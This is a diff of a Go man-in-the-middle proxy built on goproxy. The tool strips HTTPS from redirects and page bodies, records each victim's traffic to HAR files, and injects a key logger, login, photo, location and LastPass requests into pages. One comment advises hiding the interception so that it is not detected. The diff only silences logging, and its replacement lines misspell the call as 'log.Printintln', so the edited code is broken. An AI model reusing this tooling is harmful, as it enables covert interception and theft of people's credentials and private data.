@@ -2,7 +2,7 @@ package controllers
 
 import (
     "github.com/abourget/goproxy"
-    "log"
+    //"log"
     "net/http"
     "strings"
     "bytes"
@@ -38,16 +38,16 @@ var globalProxyStandard bool
 
 func StartSimpleProxy() {
 
-    log.Println(" >>> STARTING PROXY SERVER")
-    log.Println("     --- OPTION storing HAR ", globalStoreHAR )
-    log.Println("     --- OPTION redirection ", globalRedirects )
-    log.Println("     --- OPTION blocking ", globalBlocks )
-    log.Println("     --- OPTION wolf-pack-hack ", globalWolfPack )
-    log.Println("     --- OPTION inject key logger ", globalInjectKeyLogger )
-    log.Println("     --- OPTION inject login ", globalInjectGetLogin )
-    log.Println("     --- OPTION inject Photo Request ", globalInjectGetPhoto )
-    log.Println("     --- OPTION inject Location Request ", globalInjectGetLocation )
-    log.Println("     --- OPTION inject Request Lastpass ", globalInjectLastpass )
+    //log.Printintln(" >>> STARTING PROXY SERVER")
+    //log.Printintln("     --- OPTION storing HAR ", globalStoreHAR )
+    //log.Printintln("     --- OPTION redirection ", globalRedirects )
+    //log.Printintln("     --- OPTION blocking ", globalBlocks )
+    //log.Printintln("     --- OPTION wolf-pack-hack ", globalWolfPack )
+    //log.Printintln("     --- OPTION inject key logger ", globalInjectKeyLogger )
+    //log.Printintln("     --- OPTION inject login ", globalInjectGetLogin )
+    //log.Printintln("     --- OPTION inject Photo Request ", globalInjectGetPhoto )
+    //log.Printintln("     --- OPTION inject Location Request ", globalInjectGetLocation )
+    //log.Printintln("     --- OPTION inject Request Lastpass ", globalInjectLastpass )
  
     stoppableListener, _ = New(listener) //create a stoppable listener from the listener
     // Start the proxy.
@@ -58,9 +58,9 @@ func StartSimpleProxy() {
 
     //transparency
     proxy.NonProxyHandler = http.HandlerFunc(func(w http.ResponseWriter, req *http.Request) {
-        log.Println(req.URL.Scheme)
+        ////log.Printintln(req.URL.Scheme)
         if req.Host == "" {
-            log.Println(w, "Cannot handle requests without Host header, e.g., HTTP 1.0")
+            //log.Printintln(w, "Cannot handle requests without Host header, e.g., HTTP 1.0")
             return
         }
             req.URL.Scheme = "http"    
@@ -71,7 +71,7 @@ func StartSimpleProxy() {
     // Check if we are BLOCKING this page.
     if globalBlocks {
         pageBlock := TriggerBlock()
-        log.Println("blocking")
+        //log.Printintln("blocking")
         proxy.HandleRequest(goproxy.RequestHostContains(banned...)(pageBlock))
     } // end of blocks.
 
@@ -86,7 +86,7 @@ func StartSimpleProxy() {
         proxy.HandleConnectFunc( func(ctx *goproxy.ProxyCtx) goproxy.Next {
             // Potentially best to REJECT so that MITM is not detected. detection of MITM could cause suspicion
             if ctx.SNIHost() != "" {
-                log.Println(" *** HTTPS Connection: ", ctx.SNIHost())
+                //log.Printintln(" *** HTTPS Connection: ", ctx.SNIHost())
                 //return goproxy.MITM // This is failing...
                 return goproxy.NEXT
             }
@@ -97,7 +97,7 @@ func StartSimpleProxy() {
     // Handle the CLIENT-REQUEST.
     proxy.HandleRequestFunc( func(ctx *goproxy.ProxyCtx) goproxy.Next {
         // if globalStoreHAR {
-            // log.Println(" --- CLIENT REQUEST: logging HAR to "+ctx.Host()+".har")
+            // //log.Printintln(" --- CLIENT REQUEST: logging HAR to "+ctx.Host()+".har")
             ctx.LogToHARFile(true)
             t := time.Now().Local()
             timestamp := t.Format("20060102150405")
@@ -110,10 +110,10 @@ func StartSimpleProxy() {
         // Check if this is HTTPS connection via MITM.
         if ctx.IsThroughMITM {
             ctx.Req.Host = ctx.Host()
-            log.Println(" $$$ MITM: Connection is over HTTPS")
+            //log.Printintln(" $$$ MITM: Connection is over HTTPS")
             return goproxy.FORWARD // don't follow through other Request Handlers
         }
-        log.Println("ctx.Req: ", ctx.Req.Host)
+        ////log.Printintln("ctx.Req: ", ctx.Req.Host)
         return goproxy.NEXT
     })
 
@@ -129,7 +129,7 @@ func StartSimpleProxy() {
         interceptResponse := goproxy.HandlerFunc( func(ctx *goproxy.ProxyCtx) goproxy.Next {
             // Log HAR files.
             if globalStoreHAR {
-                log.Println(" --- SERVER RESPONSE: logging to "+ctx.Host()+".har")
+                ////log.Printintln(" --- SERVER RESPONSE: logging to "+ctx.Host()+".har")
                 ctx.LogToHARFile(true)
                 t := time.Now().Local()
                 timestamp := t.Format("20060102150405")
@@ -139,11 +139,11 @@ func StartSimpleProxy() {
                     proxy.FlushHARToDisk(harLocation+"/hars/req_"+strings.Split(ctx.Req.RemoteAddr, ":")[0]+"_"+ctx.Host()+"_"+ctx.Req.Method+"_"+timestamp+".har")    
                 }
             } else {
-                //log.Println(" --- SERVER REQUEST: NOT logging HAR for "+ctx.Host() )
+                ////log.Printintln(" --- SERVER REQUEST: NOT logging HAR for "+ctx.Host() )
             }
             bs, err := ioutil.ReadAll(ctx.Resp.Body)
             if err != nil {
-               log.Println("inject error: ", err)
+               //log.Printintln("inject error: ", err)
             }
             //process whether to inject scripts
             utilsModifyHeadersForInjection(ctx) //inject headers to make injection easy
@@ -181,7 +181,7 @@ func TriggerRedirect() goproxy.HandlerFunc {
 
 //
 func TriggerBlock() goproxy.HandlerFunc {
-    log.Println("blocker")
+    //log.Printintln("blocker")
     // Create a new pageBlocker handler function to pass back later on.
     pageBlocker := goproxy.HandlerFunc( func(ctx *goproxy.ProxyCtx) goproxy.Next {
         // Create the body, very naieve for now.
@@ -207,8 +207,8 @@ func TriggerWolfPack() goproxy.HandlerFunc {
             // Then we kill the original request, and make the connection ourself
             if strings.Contains(ctx.Resp.Header.Get("Location"), "https") {
 
-                log.Println(" *** ---->>> CLIENT Requested URL (redirecting): ", ctx.Resp.Request.URL)
-                log.Println(" *** <<<---- SERVER Response 301 to location: ", ctx.Resp.Header.Get("Location"))
+               // //log.Printintln(" *** ---->>> CLIENT Requested URL (redirecting): ", ctx.Resp.Request.URL)
+                ////log.Printintln(" *** <<<---- SERVER Response 301 to location: ", ctx.Resp.Header.Get("Location"))
 
                 ctx.Resp.Request.URL.Scheme = "http"
                 ctx.Resp.Header.Set("Location", strings.Replace(ctx.Resp.Header.Get("Location"), "https", "http", -1))
@@ -220,11 +220,11 @@ func TriggerWolfPack() goproxy.HandlerFunc {
                 client := &http.Client{Transport: tr}
                 server_ssl_response, err := client.Get( ctx.Resp.Header.Get("Location") )
                 if err != nil {
-                    log.Println(" help!: ", err)
+                    //log.Printintln(" help!: ", err)
                 }
                 bs, err := ioutil.ReadAll(server_ssl_response.Body)
                 if err != nil {
-                    log.Println(err)
+                    //log.Printintln(err)
                 }
                 body := string(bs)
                 body = strings.Replace(body, "https", "http", -1)
@@ -237,13 +237,13 @@ func TriggerWolfPack() goproxy.HandlerFunc {
 
             } else { 
                 // Redirecting to some HTTP page.
-                log.Println("REDIRECTED TO HTTP")
+               // //log.Printintln("REDIRECTED TO HTTP")
                 if ctx.Resp == nil {
                     return goproxy.NEXT
                 }
                 bs, err := ioutil.ReadAll(ctx.Resp.Body)
                 if err != nil {
-                    log.Println(err)
+                    //log.Printintln(err)
                 }
                 body := string(bs)
                 // strip all https out of the page so that a redirect will be required if necessary
@@ -257,13 +257,13 @@ func TriggerWolfPack() goproxy.HandlerFunc {
         } else { // end of 301-302 redirects.
             //here need to handle HTTP requests.
             //its just an HTTP page no...?
-            log.Println("--- JUST HTTP")
+            ////log.Printintln("--- JUST HTTP")
             if ctx.Resp == nil {
                 return goproxy.NEXT
             }
             bs, err := ioutil.ReadAll(ctx.Resp.Body)
             if err != nil {
-                log.Println(err)
+                //log.Printintln(err)
             }
             body := string(bs)
             // strip all https out of the page so that a redirect will be required if necessary
@@ -271,7 +271,7 @@ func TriggerWolfPack() goproxy.HandlerFunc {
             utilsModifyHeadersForInjection(ctx)
             body = utilsProcessInjectionScripts(ctx, body)
             // if globalInjectKeyLogger {
-            //     log.Println("globalInjectKeyLogger: ", globalInjectKeyLogger)
+            //     //log.Printintln("globalInjectKeyLogger: ", globalInjectKeyLogger)
             //     utilsModifyHeadersForInjection(ctx) //inject headers to make injection easy
             //     body = utilsInjector(ctx, body, INJECT_LOGGER_REPLACE, INJECT_LOGGER_RESULT )
             // }
